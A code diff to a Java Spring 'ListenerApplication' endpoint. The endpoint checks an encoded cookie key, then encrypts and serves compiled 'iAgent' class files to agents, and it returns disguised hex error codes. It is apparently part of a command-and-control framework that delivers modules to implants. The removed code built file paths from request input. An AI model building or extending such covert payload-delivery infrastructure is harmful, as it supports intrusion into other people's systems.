@@ -215,19 +215,13 @@ public class ListenerApplication {
 
 		@RequestMapping("/59009")
 		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
-		ResponseEntity<String> download(@CookieValue("__Secure-YEC") String apiKeyData, @RequestParam("v") String classNameEncoded) throws Exception, IOException, NoSuchAlgorithmException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+		ResponseEntity<String> download(@CookieValue("__Secure-YEC") String apiKeyData) throws Exception, IOException, NoSuchAlgorithmException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 		{
 			String apiKeyDecoded = new String(Base64.getDecoder().decode(apiKeyData));
 			if (!apiKeyDecoded.equals(epc.apiKey))
 			{
 				return new ResponseEntity<String>("error.0x73657373",null,HttpStatus.FORBIDDEN);
 			}
-
-			String classNameDecoded = new String(
-				Base64.getDecoder().decode(
-					classNameEncoded.getBytes()
-				)
-			);
 
 			//use .substring(0,12).replace("-",""); on agent
 			String downloadNonce = String.join(
@@ -244,29 +238,37 @@ public class ListenerApplication {
 			HttpHeaders respHeaders = new HttpHeaders();
     		respHeaders.set("uuid", downloadNonce);
 
-			byte[] fileData = new byte[]{};
-			String modPath = String.format("..%sfileroot%s%s.class",File.separator,File.separator,classNameDecoded.replace(".",File.separator));
-			if (new File(modPath).isFile())
-			{
-				fileData = Files.readAllBytes(Paths.get(modPath));
-			}
-			else
-			{
-				return new ResponseEntity<String>("error.0x66696C65",respHeaders,HttpStatus.OK);
-			}
-
-			String retrData = new String(
-				Base64.getEncoder().encode(
-					sapi.encrypt(
-						fileData,
-						downloadNonce.substring(0,12).replace("-","").getBytes(),
-						epc.agentKey
-					)
-				)
-			);
-
+			ArrayList retrData = new ArrayList();
+			File folder = new File(String.format("..%sfileroot%scom%snocebo%snCore",File.separator,File.separator,File.separator,File.separator));
+			File[] listOfFiles = folder.listFiles();
 			
-    		return new ResponseEntity<String>(retrData, respHeaders, HttpStatus.OK);
+			for (int f=0;f<listOfFiles.length;f++)
+			{
+				String fName = listOfFiles[f].getName();
+				if (fName.contains("iAgent"))
+				{
+					String cName = new String(
+						Base64.getEncoder().encode(
+							fName.replace(".class","").getBytes()
+						)
+					);
+
+					byte[] fileData = Files.readAllBytes(listOfFiles[f].toPath().toAbsolutePath());
+					String cData = new String(
+						Base64.getEncoder().encode(
+							sapi.encrypt(
+								fileData,
+								downloadNonce.substring(0,12).replace("-","").getBytes(),
+								epc.agentKey
+							)
+						)
+					);
+					retrData.add(String.format("%s.%s",cName,cData));
+
+				}
+			}
+
+    		return new ResponseEntity<String>(String.join("|",retrData), respHeaders, HttpStatus.OK);
 
 		}
 
